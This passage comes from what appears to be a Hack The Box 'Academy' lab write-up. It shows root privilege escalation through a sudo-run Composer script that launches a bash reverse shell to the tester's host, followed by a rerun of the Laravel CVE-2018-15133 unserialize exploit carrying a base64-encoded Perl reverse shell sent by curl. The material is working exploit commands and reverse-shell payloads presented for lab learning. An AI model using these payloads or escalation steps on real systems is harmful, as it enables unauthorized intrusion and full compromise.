  prohibits            [why-not] Shows which packages prevent the given package from being installed.
  remove               Removes a package from the require or require-dev.
  require              Adds required packages to your composer.json and installs them.
  run-script           [run] Runs the scripts defined in composer.json.
  search               Searches for packages.
  show                 [info] Shows information about packages.
  status               Shows a list of locally modified packages, for packages installed from source.
  suggests             Shows package suggestions.
  update               [u|upgrade] Upgrades your dependencies to the latest version according to composer.json, and updates the composer.lock file.
  validate             Validates a composer.json and composer.lock.
```
I like the sound of the run-script command.  

### 9. Escalate to root
Firstly I create a package:
```bash
mrb3n@academy:~/.local/share/composer$ composer init
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0

                                            
  Welcome to the Composer config generator  
                                            


This command will guide you through creating your composer.json config.

Package name (<vendor>/<name>) [mrb3n/composer]: jib/root
Description []: na
Author [, n to skip]: n
Minimum Stability []: 
Package Type (e.g. library, project, metapackage, composer-plugin) []: 
License []: 

Define your dependencies.

Would you like to define your dependencies (require) interactively [yes]? no
Would you like to define your dev dependencies (require-dev) interactively [yes]? no

{
    "name": "jib/root",
    "description": "na",
    "require": {}
}

Do you confirm generation [yes]? yes
```
Using a reference - https://getcomposer.org/doc/articles/scripts.md, I then edit my composer.json to add a script that will give me a reverse shell.
```json
{
    "name": "jib/root",
    "description": "na",
    "require": {},
    "scripts": {
        "post-install-cmd": [
                "@escalate"
        ],
        "escalate": [
                "bash /home/mrb3n/.local/share/composer/runme.sh"
        ]
    }
}
```
I have to put the reverse shell line in a seperate file and call it.
```bash
mrb3n@academy:~/.local/share/composer$ cat runme.sh 
bash -i >& /dev/tcp/10.10.15.158/9999 0>&1
```
Run it:
```bash
mrb3n@academy:~/.local/share/composer$ sudo composer run-script escalate
[sudo] password for mrb3n: 
PHP Warning:  PHP Startup: Unable to load dynamic library 'mysqli.so' (tried: /usr/lib/php/20190902/mysqli.so (/usr/lib/php/20190902/mysqli.so: undefined symbol: mysqlnd_global_stats), /usr/lib/php/20190902/mysqli.so.so (/usr/lib/php/20190902/mysqli.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
PHP Warning:  PHP Startup: Unable to load dynamic library 'pdo_mysql.so' (tried: /usr/lib/php/20190902/pdo_mysql.so (/usr/lib/php/20190902/pdo_mysql.so: undefined symbol: mysqlnd_allocator), /usr/lib/php/20190902/pdo_mysql.so.so (/usr/lib/php/20190902/pdo_mysql.so.so: cannot open shared object file: No such file or directory)) in Unknown on line 0
Do not run Composer as root/super user! See https://getcomposer.org/root for details
> bash /home/mrb3n/.local/share/composer/runme.sh
```
Catch the shell in my listener.
```bash
kali@kali:~/Desktop/htb/academy$ nc -lnvp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.10.215 39372
root@academy:/home/mrb3n/.local/share/composer# whoami
root
```

### Notes
I went back and worked through the initial exploit to gain the foothold agian, this time using the proof-of-concept that was used to show the initial finding: https://github.com/kozmic/laravel-poc-CVE-2018-15133.
I did make use of the python script from earlier to generate a serialized reverse shell command (see print_lavavel.py), as I had all sorts of problems with quotations and escaping the command appropriately without breaking it.
```bash
kali@kali:~/Desktop/htb/academy/laravel-poc-CVE-2018-15133$ python3 ../exploit_laravel_cve-2018-15133/print_lavavel.py dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= 10.10.15.158 9999
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjIyMzoicGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTUuMTU4IjskcD05OTk5O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vYmFzaCAtaSIpO307JyI7fQ==
kali@kali:~/Desktop/htb/academy/laravel-poc-CVE-2018-15133$ ./cve-2018-15133.php dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MTU6IkZha2VyXEdlbmVyYXRvciI6MTp7czoxMzoiACoAZm9ybWF0dGVycyI7YToxOntzOjg6ImRpc3BhdGNoIjtzOjY6InN5c3RlbSI7fX1zOjg6IgAqAGV2ZW50IjtzOjIyMzoicGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTAuMTUuMTU4IjskcD05OTk5O3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vYmFzaCAtaSIpO307JyI7fQ==
PoC for Unserialize vulnerability in Laravel <= 5.6.29 (CVE-2018-15133) by @kozmic

HTTP header for POST request: 
X-XSRF-TOKEN: eyJpdiI6IjZqT1wvNnpTc2YwNE1mODlZek5jb2d3PT0iLCJ2YWx1ZSI6IkVKZHFxRnErTFJhU0pcL1VENlhUQUpOd0xyNncxdmZxRFRFYmp4UFM3UDJaS0ZQcTNLN2QzeXVCNUc1WXhLTm5mQ3JkQmg5WnRlSWN6OXp0bVVabWZyWUVNbGRHUDNxUThlUUZraGVcL1Y2Q0E3ZkZCZUVrOHFSQ3FqcERcL0dkK3N0TkpnUE9ZMGdXK3pvVTZJaytHUk03U2tNUFJRTDJCK0xJQlEwYlZWK1dIakNlOENMUCtROEE3aHBlMXdyUGQ4QnJhelA4RGd3bWNNU2JwWHVPbUtnaXlwQ0dnNFBUQmJxZGNBUExuTE5PeEFHZm1Pb3RhT1B6eG5sWjI2cmxKNWJMSW55VlE3cHd6bmlyNU9PQ3lkOGZEdFwveGJ5WGNjSGRud21ibGFQaFE2YlNxTSt3OG9jQzZqaWxTRjNEVTJsNlE0T3JYQU51ejcrOGhUWW5vcFZDaGRPblloc2NnZFlqSlNTdnh1WUdpRTBlbEJtd1ZjTFwvSGhHVWdFeXNXMUhlT3FJMGpzdXNjQzBkdllTdDB0RCtNWVc0S2prOXE4ODlEQ1FFNVZuUW9rNUprSnBHUTZUZE15aHRPWWtWYnp6T1YrMmJnRG02TWlTQk9FUkVrTFoxdzJYVmpJdDcrbGZUMkdQRWdaSTRidVwvenRDZDNvNmhUR0dzdFVXZVc5T1EyTkJCTFREc0REb21xS0l1aFBLbzkzZz09IiwibWFjIjoiOGNhNWMzZmI5ZmJiOWM0MTdjMmMwZWNmYTQ2NzcxMDI5ZDIxNjZlZGMyYTRlMzAyMjEwOTE1MGMyYmI1MGEzZCJ9
kali@kali:~/Desktop/htb/academy/laravel-poc-CVE-2018-15133$ curl http://dev-staging-01.academy.htb -X POST -H 'X-XSRF-TOKEN: eyJpdiI6IjZqT1wvNnpTc2YwNE1mODlZek5jb2d3PT0iLCJ2YWx1ZSI6IkVKZHFxRnErTFJhU0pcL1VENlhUQUpOd0xyNncxdmZxRFRFYmp4UFM3UDJaS0ZQcTNLN2QzeXVCNUc1WXhLTm5mQ3JkQmg5WnRlSWN6OXp0bVVabWZyWUVNbGRHUDNxUThlUUZraGVcL1Y2Q0E3ZkZCZUVrOHFSQ3FqcERcL0dkK3N0TkpnUE9ZMGdXK3pvVTZJaytHUk03U2tNUFJRTDJCK0xJQlEwYlZWK1dIakNlOENMUCtROEE3aHBlMXdyUGQ4QnJhelA4RGd3bWNNU2JwWHVPbUtnaXlwQ0dnNFBUQmJxZGNBUExuTE5PeEFHZm1Pb3RhT1B6eG5sWjI2cmxKNWJMSW55VlE3cHd6bmlyNU9PQ3lkOGZEdFwveGJ5WGNjSGRud21ibGFQaFE2YlNxTSt3OG9jQzZqaWxTRjNEVTJsNlE0T3JYQU51ejcrOGhUWW5vcFZDaGRPblloc2NnZFlqSlNTdnh1WUdpRTBlbEJtd1ZjTFwvSGhHVWdFeXNXMUhlT3FJMGpzdXNjQzBkdllTdDB0RCtNWVc0S2prOXE4ODlEQ1FFNVZuUW9rNUprSnBHUTZUZE15aHRPWWtWYnp6T1YrMmJnRG02TWlTQk9FUkVrTFoxdzJYVmpJdDcrbGZUMkdQRWdaSTRidVwvenRDZDNvNmhUR0dzdFVXZVc5T1EyTkJCTFREc0REb21xS0l1aFBLbzkzZz09IiwibWFjIjoiOGNhNWMzZmI5ZmJiOWM0MTdjMmMwZWNmYTQ2NzcxMDI5ZDIxNjZlZGMyYTRlMzAyMjEwOTE1MGMyYmI1MGEzZCJ9' -s | head -n 1
```
Over on the listener:
```bash
kali@kali:~$ nc -lvnp 9999
Listening on 0.0.0.0 9999
Connection received on 10.10.10.215 42002
bash: cannot set terminal process group (826): Inappropriate ioctl for device
bash: no job control in this shell
www-data@academy:/var/www/html/htb-academy-dev-01/public$ whoami
www-data
```
